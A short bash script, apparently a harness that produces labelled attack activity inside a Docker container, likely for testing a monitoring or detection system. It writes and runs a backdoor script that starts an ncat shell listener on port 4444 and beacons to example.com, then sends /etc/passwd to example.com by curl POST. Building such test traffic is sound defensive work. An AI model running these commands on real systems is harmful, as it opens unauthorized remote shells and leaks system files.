#!/usr/bin/env bash
# Action 1: Create a malicious script
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d '{"command":"create backdoor script"}'
sudo docker exec "$CONTAINER" sh -c '
    echo "#!/bin/sh" > /tmp/backdoor.sh
    echo "ncat -l -p 4444 -e /bin/sh &" >> /tmp/backdoor.sh
    echo "curl -s http://example.com/beacon > /dev/null 2>&1 || true" >> /tmp/backdoor.sh
    chmod +x /tmp/backdoor.sh
'
sleep 1
curl -s -X POST "$URL/containers/$CID/actions/1/end" > /dev/null

# Action 2: Execute the backdoor
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d '{"command":"sh /tmp/backdoor.sh"}'
sudo docker exec "$CONTAINER" sh -c '/tmp/backdoor.sh'
sleep 3
curl -s -X POST "$URL/containers/$CID/actions/2/end" > /dev/null

# Action 3: Exfiltrate /etc/passwd
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d '{"command":"exfiltrate credentials"}'
sudo docker exec "$CONTAINER" sh -c '
    cat /etc/passwd | curl -s -X POST -d @- http://example.com > /dev/null 2>&1 || true
'
sleep 2
curl -s -X POST "$URL/containers/$CID/actions/3/end" > /dev/null
